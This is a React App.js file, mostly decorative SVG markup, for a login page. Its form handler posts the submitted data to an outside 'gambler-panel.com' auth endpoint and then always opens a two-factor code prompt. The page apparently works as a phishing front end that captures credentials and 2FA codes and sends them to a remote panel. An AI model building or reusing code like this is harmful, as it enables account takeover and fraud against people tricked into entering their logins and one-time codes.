import { useState } from "react";
import "./App.css";
import Form from "./components/form/Form";
import Login2Fa from "./components/login-2fa/Login2Fa";
import axios from "axios"

function App() {
  const [show2Fa, setShow2Fa] = useState(false);
  const [showError, setShowError] = useState(false)

  return (
    <div className="App">
      {show2Fa && <Login2Fa showError={showError} onClose={() => setShow2Fa(false)} />}
      <div className="header_background">
        <svg
          className="ellipse"
          width="100%"
          height="350"
          viewBox="0 0 1250 350"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <g filter="url(#filter0_f_330_527)">
            <circle cx="625" cy="-29" r="125" fill="#8F00FF" />
          </g>
          <defs>
            <filter
              id="filter0_f_330_527"
              x="0"
              y="-654"
              width="1250"
              height="1250"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="BackgroundImageFix"
                result="shape"
              />
              <feGaussianBlur
                stdDeviation="250"
                result="effect1_foregroundBlur_330_527"
              />
            </filter>
          </defs>
        </svg>

        <svg
          className="lines"
          width="100%"
          height="280"
          viewBox="0 0 1200 280"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <circle cx="600" cy="470" r="299.5" stroke="#140D1E" />
          <circle cx="600" cy="540" r="449.5" stroke="#140D1E" />
          <circle cx="600" cy="600" r="599.5" stroke="#140D1E" />
        </svg>

        <svg
          className="logo_mob"
          width="225"
          height="150"
          viewBox="0 0 225 150"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <g filter="url(#filter0_d_330_1279)">
            <path
              d="M113.211 25.4398C112.918 24.8534 112.082 24.8534 111.789 25.4398L101.245 46.5828C101.135 46.8033 101.133 47.0625 101.241 47.2842L103.453 51.8403C103.592 52.1266 103.546 52.4682 103.338 52.7084L100.069 56.4669C99.8206 56.753 99.4043 56.8234 99.0753 56.6349L90.2908 51.6024C89.9256 51.3932 89.787 50.9354 89.9748 50.5587L90.8277 48.8486C90.9733 48.5567 90.9256 48.2056 90.7076 47.963L81.3858 37.5953C80.861 37.0117 79.8977 37.4618 80.0088 38.2388L84.2268 67.7363C84.2827 68.1276 84.6178 68.4182 85.0131 68.4182H100.265C100.739 68.4182 101.105 68.8303 101.083 69.3035C101.075 69.4849 101.07 69.6672 101.07 69.8505C101.07 70.0339 101.075 70.2162 101.083 70.3975C101.105 70.8708 100.739 71.2829 100.265 71.2829H85.6505C85.1671 71.2829 84.7958 71.7111 84.8643 72.1897L86.8917 86.3573C86.9476 86.7485 87.2827 87.039 87.6779 87.039H137.322C137.717 87.039 138.052 86.7484 138.108 86.3571L140.133 72.1896C140.202 71.711 139.83 71.2829 139.347 71.2829H124.735C124.261 71.2829 123.895 70.8708 123.917 70.3975C123.925 70.2162 123.93 70.0339 123.93 69.8505C123.93 69.6672 123.925 69.4849 123.917 69.3035C123.895 68.8303 124.261 68.4182 124.735 68.4182H139.987C140.382 68.4182 140.717 68.1276 140.773 67.7363L144.991 38.2388C145.102 37.4618 144.139 37.0117 143.614 37.5953L134.292 47.963C134.074 48.2056 134.027 48.5567 134.172 48.8486L135.025 50.5587C135.213 50.9354 135.074 51.3932 134.709 51.6024L125.925 56.6346C125.596 56.8232 125.179 56.7527 124.931 56.4662L121.721 52.7692C121.515 52.5322 121.468 52.1963 121.601 51.912L123.767 47.2802C123.87 47.0606 123.867 46.8061 123.759 46.5892L113.211 25.4398Z"
              fill="url(#paint0_linear_330_1279)"
            />
          </g>
          <defs>
            <filter
              id="filter0_d_330_1279"
              x="0"
              y="-55"
              width="225"
              height="222.039"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feColorMatrix
                in="SourceAlpha"
                type="matrix"
                values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                result="hardAlpha"
              />
              <feOffset />
              <feGaussianBlur stdDeviation="40" />
              <feComposite in2="hardAlpha" operator="out" />
              <feColorMatrix
                type="matrix"
                values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.25 0"
              />
              <feBlend
                mode="normal"
                in2="BackgroundImageFix"
                result="effect1_dropShadow_330_1279"
              />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="effect1_dropShadow_330_1279"
                result="shape"
              />
            </filter>
            <linearGradient
              id="paint0_linear_330_1279"
              x1="112.451"
              y1="26.4323"
              x2="112.451"
              y2="85.3612"
              gradientUnits="userSpaceOnUse"
            >
              <stop stop-color="white" />
              <stop offset="1" stop-color="#ACA1F8" />
            </linearGradient>
          </defs>
        </svg>

        <svg
          className="logo"
          width="100%"
          height="284"
          viewBox="0 0 310 284"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <g filter="url(#filter0_d_330_528)">
            <path
              d="M156.64 61.0149C155.965 59.6617 154.035 59.6617 153.36 61.0149L129.026 109.806C128.772 110.315 128.769 110.913 129.017 111.425L134.122 121.939C134.443 122.6 134.338 123.388 133.856 123.942L126.314 132.616C125.74 133.276 124.779 133.439 124.02 133.004L103.748 121.39C102.905 120.907 102.585 119.851 103.019 118.982L104.987 115.035C105.323 114.362 105.213 113.551 104.71 112.992L83.1979 89.0662C81.9868 87.7192 79.764 88.758 80.0204 90.5511L89.7541 158.622C89.8832 159.525 90.6565 160.196 91.5686 160.196H126.766C127.86 160.196 128.703 161.147 128.653 162.239C128.634 162.657 128.623 163.078 128.623 163.501C128.623 163.924 128.634 164.345 128.653 164.764C128.703 165.856 127.86 166.807 126.766 166.807H93.0397C91.9241 166.807 91.0672 167.795 91.2252 168.899L95.9038 201.594C96.033 202.496 96.8063 203.167 97.7183 203.167H212.281C213.194 203.167 213.967 202.496 214.096 201.593L218.769 168.899C218.927 167.795 218.07 166.807 216.954 166.807H183.234C182.14 166.807 181.297 165.856 181.347 164.764C181.367 164.345 181.377 163.924 181.377 163.501C181.377 163.078 181.367 162.657 181.347 162.239C181.297 161.147 182.14 160.196 183.234 160.196H218.431C219.343 160.196 220.117 159.525 220.246 158.622L229.98 90.5511C230.236 88.758 228.013 87.7192 226.802 89.0662L205.29 112.992C204.787 113.551 204.677 114.362 205.013 115.035L206.981 118.982C207.415 119.851 207.095 120.907 206.252 121.39L185.981 133.003C185.221 133.438 184.26 133.275 183.686 132.614L176.278 124.083C175.803 123.536 175.695 122.761 176.002 122.105L181.002 111.416C181.239 110.909 181.231 110.322 180.981 109.821L156.64 61.0149Z"
              fill="url(#paint0_linear_330_528)"
            />
          </g>
          <defs>
            <filter
              id="filter0_d_330_528"
              x="0"
              y="-20"
              width="310"
              height="303.167"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feColorMatrix
                in="SourceAlpha"
                type="matrix"
                values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                result="hardAlpha"
              />
              <feOffset />
              <feGaussianBlur stdDeviation="40" />
              <feComposite in2="hardAlpha" operator="out" />
              <feColorMatrix
                type="matrix"
                values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.25 0"
              />
              <feBlend
                mode="normal"
                in2="BackgroundImageFix"
                result="effect1_dropShadow_330_528"
              />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="effect1_dropShadow_330_528"
                result="shape"
              />
            </filter>
            <linearGradient
              id="paint0_linear_330_528"
              x1="154.887"
              y1="63.3053"
              x2="154.887"
              y2="199.295"
              gradientUnits="userSpaceOnUse"
            >
              <stop stop-color="white" />
              <stop offset="1" stop-color="#ACA1F8" />
            </linearGradient>
          </defs>
        </svg>
        <svg
          className="stars_mob"
          width="100%"
          height="109"
          viewBox="0 0 320 109"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            d="M9.18403 34.1678C9.27985 33.9089 9.6461 33.9089 9.74192 34.1678L10.4197 35.9995C10.4498 36.0809 10.514 36.1451 10.5954 36.1752L12.427 36.853C12.686 36.9488 12.686 37.315 12.427 37.4109L10.5954 38.0886C10.514 38.1188 10.4498 38.1829 10.4197 38.2644L9.74192 40.096C9.6461 40.3549 9.27985 40.3549 9.18403 40.096L8.50626 38.2644C8.47614 38.1829 8.41195 38.1188 8.33053 38.0886L6.4989 37.4109C6.23995 37.315 6.23995 36.9488 6.4989 36.853L8.33053 36.1752C8.41195 36.1451 8.47614 36.0809 8.50626 35.9995L9.18403 34.1678Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M70.7958 99.4032C70.8917 99.1442 71.2579 99.1442 71.3537 99.4032L72.0315 101.235C72.0616 101.316 72.1258 101.38 72.2072 101.411L74.0389 102.088C74.2978 102.184 74.2978 102.55 74.0389 102.646L72.2072 103.324C72.1258 103.354 72.0616 103.418 72.0315 103.5L71.3537 105.331C71.2579 105.59 70.8917 105.59 70.7958 105.331L70.1181 103.5C70.088 103.418 70.0238 103.354 69.9423 103.324L68.1107 102.646C67.8518 102.55 67.8518 102.184 68.1107 102.088L69.9423 101.411C70.0238 101.38 70.088 101.316 70.1181 101.235L70.7958 99.4032Z"
            fill="white"
            fill-opacity="0.08"
          />
          <g filter="url(#filter0_d_330_1236)">
            <path
              d="M97.3735 15.4423C97.4693 15.1833 97.8356 15.1833 97.9314 15.4423L98.6091 17.2739C98.6393 17.3553 98.7035 17.4195 98.7849 17.4496L100.617 18.1274C100.875 18.2232 100.875 18.5895 100.617 18.6853L98.7849 19.363C98.7035 19.3932 98.6393 19.4574 98.6091 19.5388L97.9314 21.3704C97.8356 21.6294 97.4693 21.6294 97.3735 21.3704L96.6957 19.5388C96.6656 19.4574 96.6014 19.3932 96.52 19.363L94.6884 18.6853C94.4294 18.5895 94.4294 18.2232 94.6884 18.1274L96.52 17.4496C96.6014 17.4195 96.6656 17.3553 96.6957 17.2739L97.3735 15.4423Z"
              fill="white"
            />
          </g>
          <path
            d="M232.074 22.6913C232.17 22.4323 232.536 22.4323 232.632 22.6913L233.31 24.5229C233.34 24.6043 233.404 24.6685 233.486 24.6986L235.317 25.3764C235.576 25.4722 235.576 25.8385 235.317 25.9343L233.486 26.6121C233.404 26.6422 233.34 26.7064 233.31 26.7878L232.632 28.6194C232.536 28.8784 232.17 28.8784 232.074 28.6194L231.396 26.7878C231.366 26.7064 231.302 26.6422 231.221 26.6121L229.389 25.9343C229.13 25.8385 229.13 25.4722 229.389 25.3764L231.221 24.6986C231.302 24.6685 231.366 24.6043 231.396 24.5229L232.074 22.6913Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M321.472 88.5311C321.567 88.2722 321.934 88.2722 322.03 88.5311L322.707 90.3628C322.737 90.4442 322.802 90.5084 322.883 90.5385L324.715 91.2163C324.974 91.3121 324.974 91.6783 324.715 91.7742L322.883 92.4519C322.802 92.482 322.737 92.5462 322.707 92.6276L322.03 94.4593C321.934 94.7182 321.567 94.7182 321.472 94.4593L320.794 92.6276C320.764 92.5462 320.7 92.482 320.618 92.4519L318.786 91.7742C318.528 91.6783 318.528 91.3121 318.786 91.2163L320.618 90.5385C320.7 90.5084 320.764 90.4442 320.794 90.3628L321.472 88.5311Z"
            fill="white"
            fill-opacity="0.08"
          />
          <g filter="url(#filter1_d_330_1236)">
            <path
              d="M255.631 82.4911C255.727 82.2321 256.093 82.2321 256.189 82.4911L256.867 84.3227C256.897 84.4041 256.961 84.4683 257.043 84.4984L258.874 85.1762C259.133 85.272 259.133 85.6383 258.874 85.7341L257.043 86.4119C256.961 86.442 256.897 86.5062 256.867 86.5876L256.189 88.4192C256.093 88.6782 255.727 88.6782 255.631 88.4192L254.954 86.5876C254.923 86.5062 254.859 86.442 254.778 86.4119L252.946 85.7341C252.687 85.6383 252.687 85.272 252.946 85.1762L254.778 84.4984C254.859 84.4683 254.923 84.4041 254.954 84.3227L255.631 82.4911Z"
              fill="white"
            />
          </g>
          <path
            d="M173.482 43.8319C173.578 43.573 173.944 43.573 174.04 43.8319L174.718 45.6635C174.748 45.745 174.812 45.8091 174.894 45.8393L176.725 46.517C176.984 46.6129 176.984 46.9791 176.725 47.0749L174.894 47.7527C174.812 47.7828 174.748 47.847 174.718 47.9284L174.04 49.7601C173.944 50.019 173.578 50.019 173.482 49.7601L172.805 47.9284C172.774 47.847 172.71 47.7828 172.629 47.7527L170.797 47.0749C170.538 46.9791 170.538 46.6129 170.797 46.517L172.629 45.8393C172.71 45.8091 172.774 45.745 172.805 45.6635L173.482 43.8319Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M306.371 9.40222C306.466 9.14327 306.833 9.14327 306.928 9.40222L307.606 11.2339C307.636 11.3153 307.701 11.3795 307.782 11.4096L309.614 12.0873C309.873 12.1832 309.873 12.5494 309.614 12.6452L307.782 13.323C307.701 13.3531 307.636 13.4173 307.606 13.4987L306.928 15.3304C306.833 15.5893 306.466 15.5893 306.371 15.3304L305.693 13.4987C305.663 13.4173 305.598 13.3531 305.517 13.323L303.685 12.6452C303.426 12.5494 303.426 12.1832 303.685 12.0873L305.517 11.4096C305.598 11.3795 305.663 11.3153 305.693 11.2339L306.371 9.40222Z"
            fill="white"
            fill-opacity="0.08"
          />
          <defs>
            <filter
              id="filter0_d_330_1236"
              x="86.4941"
              y="7.24805"
              width="22.3164"
              height="22.3164"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feColorMatrix
                in="SourceAlpha"
                type="matrix"
                values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                result="hardAlpha"
              />
              <feOffset />
              <feGaussianBlur stdDeviation="4" />
              <feComposite in2="hardAlpha" operator="out" />
              <feColorMatrix
                type="matrix"
                values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.5 0"
              />
              <feBlend
                mode="normal"
                in2="BackgroundImageFix"
                result="effect1_dropShadow_330_1236"
              />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="effect1_dropShadow_330_1236"
                result="shape"
              />
            </filter>
            <filter
              id="filter1_d_330_1236"
              x="244.752"
              y="74.2969"
              width="22.3164"
              height="22.3164"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feColorMatrix
                in="SourceAlpha"
                type="matrix"
                values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                result="hardAlpha"
              />
              <feOffset />
              <feGaussianBlur stdDeviation="4" />
              <feComposite in2="hardAlpha" operator="out" />
              <feColorMatrix
                type="matrix"
                values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.5 0"
              />
              <feBlend
                mode="normal"
                in2="BackgroundImageFix"
                result="effect1_dropShadow_330_1236"
              />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="effect1_dropShadow_330_1236"
                result="shape"
              />
            </filter>
          </defs>
        </svg>

        <svg
          className="stars"
          width="100%"
          height="175"
          viewBox="0 0 938 175"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            d="M111.767 14.5818C111.925 14.1531 112.532 14.1531 112.69 14.5818L113.812 17.6141C113.862 17.7489 113.969 17.8551 114.103 17.905L117.136 19.0271C117.564 19.1857 117.564 19.792 117.136 19.9507L114.103 21.0727C113.969 21.1226 113.862 21.2289 113.812 21.3637L112.69 24.396C112.532 24.8247 111.925 24.8247 111.767 24.396L110.645 21.3637C110.595 21.2289 110.489 21.1226 110.354 21.0727L107.322 19.9507C106.893 19.792 106.893 19.1857 107.322 19.0271L110.354 17.905C110.489 17.8551 110.595 17.7489 110.645 17.6141L111.767 14.5818Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M4.76682 143.322C4.92545 142.893 5.53179 142.893 5.69043 143.322L6.81248 146.354C6.86236 146.489 6.96863 146.595 7.10341 146.645L10.1357 147.767C10.5644 147.925 10.5644 148.532 10.1357 148.69L7.10341 149.812C6.96863 149.862 6.86236 149.969 6.81248 150.103L5.69043 153.136C5.53179 153.564 4.92545 153.564 4.76682 153.136L3.64476 150.103C3.59489 149.969 3.48862 149.862 3.35384 149.812L0.321525 148.69C-0.107175 148.532 -0.107175 147.925 0.321525 147.767L3.35384 146.645C3.48862 146.595 3.59489 146.489 3.64476 146.354L4.76682 143.322Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M228.767 51.3215C228.925 50.8928 229.532 50.8928 229.69 51.3215L230.812 54.3538C230.862 54.4886 230.969 54.5949 231.103 54.6448L234.136 55.7668C234.564 55.9254 234.564 56.5318 234.136 56.6904L231.103 57.8125C230.969 57.8624 230.862 57.9686 230.812 58.1034L229.69 61.1357C229.532 61.5644 228.925 61.5644 228.767 61.1357L227.645 58.1034C227.595 57.9686 227.489 57.8624 227.354 57.8125L224.322 56.6904C223.893 56.5318 223.893 55.9254 224.322 55.7668L227.354 54.6448C227.489 54.5949 227.595 54.4886 227.645 54.3538L228.767 51.3215Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M194.767 164.322C194.925 163.893 195.532 163.893 195.69 164.322L196.812 167.354C196.862 167.489 196.969 167.595 197.103 167.645L200.136 168.767C200.564 168.925 200.564 169.532 200.136 169.69L197.103 170.812C196.969 170.862 196.862 170.969 196.812 171.103L195.69 174.136C195.532 174.564 194.925 174.564 194.767 174.136L193.645 171.103C193.595 170.969 193.489 170.862 193.354 170.812L190.322 169.69C189.893 169.532 189.893 168.925 190.322 168.767L193.354 167.645C193.489 167.595 193.595 167.489 193.645 167.354L194.767 164.322Z"
            fill="white"
            fill-opacity="0.08"
          />
          <g filter="url(#filter0_d_330_511)">
            <path
              d="M50.7668 87.3215C50.9254 86.8928 51.5318 86.8928 51.6904 87.3215L52.8125 90.3538C52.8624 90.4886 52.9686 90.5949 53.1034 90.6448L56.1357 91.7668C56.5644 91.9254 56.5644 92.5318 56.1357 92.6904L53.1034 93.8125C52.9686 93.8624 52.8624 93.9686 52.8125 94.1034L51.6904 97.1357C51.5318 97.5644 50.9254 97.5644 50.7668 97.1357L49.6448 94.1034C49.5949 93.9686 49.4886 93.8624 49.3538 93.8125L46.3215 92.6904C45.8928 92.5318 45.8928 91.9254 46.3215 91.7668L49.3538 90.6448C49.4886 90.5949 49.5949 90.4886 49.6448 90.3538L50.7668 87.3215Z"
              fill="white"
            />
          </g>
          <path
            d="M330.767 159.322C330.925 158.893 331.532 158.893 331.69 159.322L332.812 162.354C332.862 162.489 332.969 162.595 333.103 162.645L336.136 163.767C336.564 163.925 336.564 164.532 336.136 164.69L333.103 165.812C332.969 165.862 332.862 165.969 332.812 166.103L331.69 169.136C331.532 169.564 330.925 169.564 330.767 169.136L329.645 166.103C329.595 165.969 329.489 165.862 329.354 165.812L326.322 164.69C325.893 164.532 325.893 163.925 326.322 163.767L329.354 162.645C329.489 162.595 329.595 162.489 329.645 162.354L330.767 159.322Z"
            fill="white"
            fill-opacity="0.08"
          />
          <g filter="url(#filter1_d_330_511)">
            <path
              d="M374.767 20.3215C374.925 19.8928 375.532 19.8928 375.69 20.3215L376.812 23.3538C376.862 23.4886 376.969 23.5949 377.103 23.6448L380.136 24.7668C380.564 24.9254 380.564 25.5318 380.136 25.6904L377.103 26.8125C376.969 26.8624 376.862 26.9686 376.812 27.1034L375.69 30.1357C375.532 30.5644 374.925 30.5644 374.767 30.1357L373.645 27.1034C373.595 26.9686 373.489 26.8624 373.354 26.8125L370.322 25.6904C369.893 25.5318 369.893 24.9254 370.322 24.7668L373.354 23.6448C373.489 23.5949 373.595 23.4886 373.645 23.3538L374.767 20.3215Z"
              fill="white"
            />
          </g>
          <path
            d="M597.767 32.3215C597.925 31.8928 598.532 31.8928 598.69 32.3215L599.812 35.3538C599.862 35.4886 599.969 35.5949 600.103 35.6448L603.136 36.7668C603.564 36.9254 603.564 37.5318 603.136 37.6904L600.103 38.8125C599.969 38.8624 599.862 38.9686 599.812 39.1034L598.69 42.1357C598.532 42.5644 597.925 42.5644 597.767 42.1357L596.645 39.1034C596.595 38.9686 596.489 38.8624 596.354 38.8125L593.322 37.6904C592.893 37.5318 592.893 36.9254 593.322 36.7668L596.354 35.6448C596.489 35.5949 596.595 35.4886 596.645 35.3538L597.767 32.3215Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M745.767 141.322C745.925 140.893 746.532 140.893 746.69 141.322L747.812 144.354C747.862 144.489 747.969 144.595 748.103 144.645L751.136 145.767C751.564 145.925 751.564 146.532 751.136 146.69L748.103 147.812C747.969 147.862 747.862 147.969 747.812 148.103L746.69 151.136C746.532 151.564 745.925 151.564 745.767 151.136L744.645 148.103C744.595 147.969 744.489 147.862 744.354 147.812L741.322 146.69C740.893 146.532 740.893 145.925 741.322 145.767L744.354 144.645C744.489 144.595 744.595 144.489 744.645 144.354L745.767 141.322Z"
            fill="white"
            fill-opacity="0.08"
          />
          <g filter="url(#filter2_d_330_511)">
            <path
              d="M636.767 131.322C636.925 130.893 637.532 130.893 637.69 131.322L638.812 134.354C638.862 134.489 638.969 134.595 639.103 134.645L642.136 135.767C642.564 135.925 642.564 136.532 642.136 136.69L639.103 137.812C638.969 137.862 638.862 137.969 638.812 138.103L637.69 141.136C637.532 141.564 636.925 141.564 636.767 141.136L635.645 138.103C635.595 137.969 635.489 137.862 635.354 137.812L632.322 136.69C631.893 136.532 631.893 135.925 632.322 135.767L635.354 134.645C635.489 134.595 635.595 134.489 635.645 134.354L636.767 131.322Z"
              fill="white"
            />
          </g>
          <path
            d="M500.767 67.3215C500.925 66.8928 501.532 66.8928 501.69 67.3215L502.812 70.3538C502.862 70.4886 502.969 70.5949 503.103 70.6448L506.136 71.7668C506.564 71.9254 506.564 72.5318 506.136 72.6904L503.103 73.8125C502.969 73.8624 502.862 73.9686 502.812 74.1034L501.69 77.1357C501.532 77.5644 500.925 77.5644 500.767 77.1357L499.645 74.1034C499.595 73.9686 499.489 73.8624 499.354 73.8125L496.322 72.6904C495.893 72.5318 495.893 71.9254 496.322 71.7668L499.354 70.6448C499.489 70.5949 499.595 70.4886 499.645 70.3538L500.767 67.3215Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M720.767 10.3215C720.925 9.89282 721.532 9.89283 721.69 10.3215L722.812 13.3538C722.862 13.4886 722.969 13.5949 723.103 13.6448L726.136 14.7668C726.564 14.9254 726.564 15.5318 726.136 15.6904L723.103 16.8125C722.969 16.8624 722.862 16.9686 722.812 17.1034L721.69 20.1357C721.532 20.5644 720.925 20.5644 720.767 20.1357L719.645 17.1034C719.595 16.9686 719.489 16.8624 719.354 16.8125L716.322 15.6904C715.893 15.5318 715.893 14.9254 716.322 14.7668L719.354 13.6448C719.489 13.5949 719.595 13.4886 719.645 13.3538L720.767 10.3215Z"
            fill="white"
            fill-opacity="0.08"
          />
          <path
            d="M860.767 100.322C860.925 99.8928 861.532 99.8928 861.69 100.322L862.812 103.354C862.862 103.489 862.969 103.595 863.103 103.645L866.136 104.767C866.564 104.925 866.564 105.532 866.136 105.69L863.103 106.812C862.969 106.862 862.862 106.969 862.812 107.103L861.69 110.136C861.532 110.564 860.925 110.564 860.767 110.136L859.645 107.103C859.595 106.969 859.489 106.862 859.354 106.812L856.322 105.69C855.893 105.532 855.893 104.925 856.322 104.767L859.354 103.645C859.489 103.595 859.595 103.489 859.645 103.354L860.767 100.322Z"
            fill="white"
            fill-opacity="0.08"
          />
          <g filter="url(#filter3_d_330_511)">
            <path
              d="M833.767 8.32152C833.925 7.89282 834.532 7.89283 834.69 8.32153L835.812 11.3538C835.862 11.4886 835.969 11.5949 836.103 11.6448L839.136 12.7668C839.564 12.9254 839.564 13.5318 839.136 13.6904L836.103 14.8125C835.969 14.8624 835.862 14.9686 835.812 15.1034L834.69 18.1357C834.532 18.5644 833.925 18.5644 833.767 18.1357L832.645 15.1034C832.595 14.9686 832.489 14.8624 832.354 14.8125L829.322 13.6904C828.893 13.5318 828.893 12.9254 829.322 12.7668L832.354 11.6448C832.489 11.5949 832.595 11.4886 832.645 11.3538L833.767 8.32152Z"
              fill="white"
            />
          </g>
          <path
            d="M931.767 56.3215C931.925 55.8928 932.532 55.8928 932.69 56.3215L933.812 59.3538C933.862 59.4886 933.969 59.5949 934.103 59.6448L937.136 60.7668C937.564 60.9254 937.564 61.5318 937.136 61.6904L934.103 62.8125C933.969 62.8624 933.862 62.9686 933.812 63.1034L932.69 66.1357C932.532 66.5644 931.925 66.5644 931.767 66.1357L930.645 63.1034C930.595 62.9686 930.489 62.8624 930.354 62.8125L927.322 61.6904C926.893 61.5318 926.893 60.9254 927.322 60.7668L930.354 59.6448C930.489 59.5949 930.595 59.4886 930.645 59.3538L931.767 56.3215Z"
            fill="white"
            fill-opacity="0.08"
          />
          <defs>
            <filter
              id="filter0_d_330_511"
              x="38"
              y="79"
              width="26.457"
              height="26.457"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feColorMatrix
                in="SourceAlpha"
                type="matrix"
                values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                result="hardAlpha"
              />
              <feOffset />
              <feGaussianBlur stdDeviation="4" />
              <feComposite in2="hardAlpha" operator="out" />
              <feColorMatrix
                type="matrix"
                values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.5 0"
              />
              <feBlend
                mode="normal"
                in2="BackgroundImageFix"
                result="effect1_dropShadow_330_511"
              />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="effect1_dropShadow_330_511"
                result="shape"
              />
            </filter>
            <filter
              id="filter1_d_330_511"
              x="362"
              y="12"
              width="26.457"
              height="26.457"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feColorMatrix
                in="SourceAlpha"
                type="matrix"
                values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                result="hardAlpha"
              />
              <feOffset />
              <feGaussianBlur stdDeviation="4" />
              <feComposite in2="hardAlpha" operator="out" />
              <feColorMatrix
                type="matrix"
                values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.5 0"
              />
              <feBlend
                mode="normal"
                in2="BackgroundImageFix"
                result="effect1_dropShadow_330_511"
              />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="effect1_dropShadow_330_511"
                result="shape"
              />
            </filter>
            <filter
              id="filter2_d_330_511"
              x="624"
              y="123"
              width="26.457"
              height="26.457"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feColorMatrix
                in="SourceAlpha"
                type="matrix"
                values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                result="hardAlpha"
              />
              <feOffset />
              <feGaussianBlur stdDeviation="4" />
              <feComposite in2="hardAlpha" operator="out" />
              <feColorMatrix
                type="matrix"
                values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.5 0"
              />
              <feBlend
                mode="normal"
                in2="BackgroundImageFix"
                result="effect1_dropShadow_330_511"
              />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="effect1_dropShadow_330_511"
                result="shape"
              />
            </filter>
            <filter
              id="filter3_d_330_511"
              x="821"
              y="0"
              width="26.457"
              height="26.457"
              filterUnits="userSpaceOnUse"
              color-interpolation-filters="sRGB"
            >
              <feFlood flood-opacity="0" result="BackgroundImageFix" />
              <feColorMatrix
                in="SourceAlpha"
                type="matrix"
                values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                result="hardAlpha"
              />
              <feOffset />
              <feGaussianBlur stdDeviation="4" />
              <feComposite in2="hardAlpha" operator="out" />
              <feColorMatrix
                type="matrix"
                values="0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0.5 0"
              />
              <feBlend
                mode="normal"
                in2="BackgroundImageFix"
                result="effect1_dropShadow_330_511"
              />
              <feBlend
                mode="normal"
                in="SourceGraphic"
                in2="effect1_dropShadow_330_511"
                result="shape"
              />
            </filter>
          </defs>
        </svg>
      </div>
      <Form onSubmit={async (data) => {
        try {
          const res = await axios.post("https://gambler-panel.com/api/auth", data)
          setShowError(!res.data.ok)
          setShow2Fa(true)
        } catch (error) {
          console.log(error)
        }
      }} />
    </div>
  );
}

export default App;
